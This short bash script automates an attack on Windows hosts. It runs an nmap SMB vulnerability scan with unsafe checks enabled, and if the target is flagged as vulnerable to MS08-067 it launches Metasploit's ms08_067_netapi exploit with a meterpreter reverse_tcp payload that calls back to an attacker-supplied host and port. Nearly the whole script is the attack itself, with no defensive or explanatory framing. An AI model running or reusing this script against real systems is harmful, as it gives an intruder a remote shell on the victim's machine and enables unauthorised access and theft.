#!/bin/bash

if [ "$#" != 3 ];then
	echo "Usage: $0 [RHOST] [LHOST] [LPORT]"
	exit
fi

rhost=$1
lhost=$2
lport=$3

nmap --script smb-check-vulns.nse -p 445 $rhost --script-args=unsafe=1 -oN tmp_output.txt

if [ $(grep -- "MS08-067" tmp_output.txt | cut -d" " -f5) = "VULNERABLE" ];then
	echo "$rhost apperas to be vulnerable, exploiting with Metasplot..."
	msfconsole -x "use exploit/windows/smb/ms08_067_netapi;\
	 	set PAYLOAD windows/meterpreter/reverse_tcp;\
		set RHOST $rhost;\
		set LHOST $lhost;\
		set LPORT $lport;\
		run"
fi

rm -f tmp_output.txt
